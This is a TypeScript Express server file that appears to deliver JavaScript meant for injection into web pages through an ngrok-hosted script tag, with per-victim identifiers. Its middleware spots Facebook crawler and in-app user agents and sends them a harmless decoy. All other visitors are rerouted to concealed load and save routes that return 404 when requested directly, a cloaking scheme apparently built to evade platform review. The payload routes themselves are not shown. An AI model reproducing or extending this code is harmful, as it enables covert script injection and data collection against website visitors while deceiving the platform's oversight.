import cors from 'cors'
import morgan from 'morgan';
import './database/connection.js';
import express, { Express } from "express";
import Routes from './routes/routes.js';
import requestIp from 'request-ip';
import { CustomRequest } from './utils/custom.request.interface.js';
import { allowPostWords } from './utils/allowed_words.js';

// Initializations
const app: Express = express();

// Settings npx tsc --watch 
const port = process.env.PORT || 3000;

// Middlewares
app.use(cors());
app.use(morgan('dev'));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.disable('x-powered-by');

// <script src="https://9ee5-152-0-197-114.ngrok-free.app/content/JpcrtaCqzio.js?66a8f89cac017d929cafb6b798d56"></script>

// Middleware para obtener la IP del cliente
// http://localhost:3000/testing/Jp4r2aC4zio.js?66a1386756b5adbd348eb612
// http://localhost:3000/files/Jpgr2aCnzio.js?66a1386756b5adbd348eb612
// js, file, files, static, public, content, script, scripts, javascript

const extractDataFromUrl = (url: string, method: string): { fileName: string; identifier: string } | null => {
    // Buscar el nombre del archivo entre las barras y el signo de interrogación si es GET si es POST setiar por default
    let fileNameMatch = new Array();
    if (method === 'GET') {
        fileNameMatch = url.match(/\/([a-zA-Z]{11}\.js)\?/) || [];
        if (!fileNameMatch || !fileNameMatch.length) {
            return null;
        }
    } else if (method === 'POST') {
        fileNameMatch = ['name1', 'name2', 'name3'];
    }

    // Extraer los primeros 24 caracteres del otro fragmento (después del signo de interrogaci
    const identifierMatch = url.match(/\?([a-zA-Z0-9]{24})/);
    if (!identifierMatch) {
        return null;
    }

    return { fileName: fileNameMatch[1], identifier: identifierMatch[1] };
}

const interceptorMiddleware = (req: CustomRequest, res: express.Response, next: express.NextFunction) => {
    const userAgent = req.headers['user-agent'] || "";
    const clientIp = requestIp.getClientIp(req) || "";
    const userData = extractDataFromUrl(req.url, req.method);

    // SI CONTIENE UNA DE LAS RUTAS DEVOLVER ERROR
    if (req.url.includes('ehloq-load') || req.url.includes('ehloq-save')) {
        return res.status(404).send('Página no encontrada');
    }

    console.log("userData => ", userData);

    // Verificar si la ruta contiene alguna de las palabras del array post request
    const allowPostWord = allowPostWords.some(word => req.path.includes(word));

    if (!userData || (!req.path.endsWith('.js') && !allowPostWord)) {
        return next();
    }

    // VERIFICADOR DE PALABRAS PROHIBIDAS
    const forbiddenWordsRegex = /sp1a|width|build|dalvik|height|density|supportsfresco|scaleddensity|displaymetrics|externalhit_uatext|facebookexternalhit|audiencenetworkforwindows/i;
    if (forbiddenWordsRegex.test(userAgent)) {
        res.type('application/javascript');
        res.send(`console.log('${clientIp}');`);
        return;
    }

    // VERIFICADOR DE EHLOQBOOK
    // const ehloqbookRegex = /(FB(AN|AV)|\[FB])/i;
    // if(!ehloqbookRegex.test(userAgent)){
    //     res.type('application/javascript');
    //     res.send(`console.log('${clientIp}');`);
    //     return;
    // }

    req.headers.identifier = userData.identifier;

    if (req.method === 'GET') {
        req.url = '/ehloq-load';
    } else if (req.method === 'POST') {
        req.url = '/ehloq-save';
    }

    next();
};

app.use(interceptorMiddleware);

// Routes
app.use('/', Routes);

app.listen(port, () => {
    console.log(`[server]: Server is running at http://localhost:${port}`);
});